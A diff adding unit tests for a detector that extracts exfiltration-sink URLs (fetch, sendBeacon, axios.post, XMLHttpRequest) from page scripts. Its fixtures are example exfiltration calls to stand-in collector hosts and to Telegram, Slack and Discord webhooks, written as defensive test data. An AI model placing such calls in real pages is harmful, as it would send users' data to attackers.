@@ -9,6 +9,7 @@ import {
   followToFinalResponse,
   enforceResponseLimits,
   extractJsRedirectTargets,
+  extractScriptSinkTargets,
   type FetchDeps,
 } from "../src/lib/page-fetch";
 
@@ -258,5 +259,75 @@ describe("extractJsRedirectTargets", () => {
   });
   it("returns empty for script with no redirect", () => {
     expect(extractJsRedirectTargets(`console.log("hello world")`)).toEqual([]);
+  });
+});
+
+// ─── Exfil sink target extraction (Lane 3 §3.1 B1, page-fetch.ts:407-439) ──
+// Structurally identical extraction to extractJsRedirectTargets above —
+// same marker-then-next-quoted-segment walk, same no-catastrophic-
+// backtracking contract — over request-shaped markers instead of
+// redirect-shaped ones. This is the leg that closes the live false
+// negative in offdomain_form_exfil, which reads <form action> ONLY.
+
+describe("extractScriptSinkTargets", () => {
+  it("fetch(): pulls a double-quoted target", () => {
+    expect(
+      extractScriptSinkTargets(`fetch("https://api.telegram.org/bot123456:ABC-token/sendMessage")`),
+    ).toContain("https://api.telegram.org/bot123456:ABC-token/sendMessage");
+  });
+
+  it("fetch(): pulls a single-quoted target", () => {
+    expect(extractScriptSinkTargets(`fetch('https://evil-collector.example/x')`))
+      .toContain("https://evil-collector.example/x");
+  });
+
+  it("fetch(): pulls a backtick-quoted target", () => {
+    expect(extractScriptSinkTargets("fetch(`https://evil-collector.example/y`)"))
+      .toContain("https://evil-collector.example/y");
+  });
+
+  it("navigator.sendBeacon(): pulls the target (case-insensitive marker match)", () => {
+    expect(
+      extractScriptSinkTargets(`navigator.sendBeacon("https://hooks.slack.com/services/T000/B000/XXXX")`),
+    ).toContain("https://hooks.slack.com/services/T000/B000/XXXX");
+  });
+
+  it("axios.post(): pulls the target", () => {
+    expect(extractScriptSinkTargets(`axios.post('https://discord.com/api/webhooks/999/abc')`))
+      .toContain("https://discord.com/api/webhooks/999/abc");
+  });
+
+  it("XMLHttpRequest: pulls the first quoted string found within the marker's window", () => {
+    expect(
+      extractScriptSinkTargets(`var req = XMLHttpRequest("https://api.telegram.org/bot777:ZZ/x")`),
+    ).toContain("https://api.telegram.org/bot777:ZZ/x");
+  });
+
+  it("known dud, documented: .open()'s FIRST quoted segment is the HTTP method, not the URL", () => {
+    // The marker itself is intentionally kept (page-fetch.ts:399-405) even
+    // though the common xhr.open('METHOD', url) call shape means this leg
+    // mostly yields the verb, not the target. fetch()/sendBeacon()/
+    // axios.post() carry the recall for the URL itself.
+    const targets = extractScriptSinkTargets(`xhr.open('POST', 'https://evil-collector.example/exfil');`);
+    expect(targets).toContain("POST");
+    expect(targets).not.toContain("https://evil-collector.example/exfil");
+  });
+
+  it("no match within the 300-char window after the marker yields nothing for that occurrence", () => {
+    const filler = "x".repeat(310);
+    const script = `fetch(${filler}"https://evil-collector.example/too-far")`;
+    expect(extractScriptSinkTargets(script)).toEqual([]);
+  });
+
+  it("bounded at 32 total targets even with far more matching occurrences", () => {
+    const script = Array.from(
+      { length: 40 },
+      (_, i) => `fetch("https://evil-collector.example/${i}")`,
+    ).join(";\n");
+    expect(extractScriptSinkTargets(script)).toHaveLength(32);
+  });
+
+  it("returns empty for script with none of the request-shaped markers", () => {
+    expect(extractScriptSinkTargets(`console.log("hello world")`)).toEqual([]);
   });
 });
